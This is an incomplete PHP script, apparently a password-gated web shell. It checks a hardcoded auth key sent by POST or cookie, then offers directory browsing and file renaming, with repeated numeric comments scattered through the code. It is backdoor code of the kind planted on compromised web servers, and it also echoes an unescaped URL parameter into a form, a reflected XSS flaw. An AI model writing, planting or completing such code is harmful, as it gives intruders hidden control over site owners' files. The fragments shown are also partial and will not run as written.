...
$auth_key = "e2f2d10231c076274cbc76336b530c67";
...
$pass = false;
if (isset($_COOKIE['pw_name_11896'])) {
    if(($_COOKIE['pw_name_11896']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_11896'])) {
        if(($_POST['pw_name_11896']) == $auth_key) {
            setcookie("pw_name_11896", $_POST['pw_name_11896']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_11896' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1721147785387216 1721147785108650 1721147785293963 1721147785511816
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1721147785387216 1721147785108650 1721147785293963 1721147785511816
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1721147785387216 1721147785108650 1721147785293963 1721147785511816
            $name = PATH . "/" . $_GET['r'];
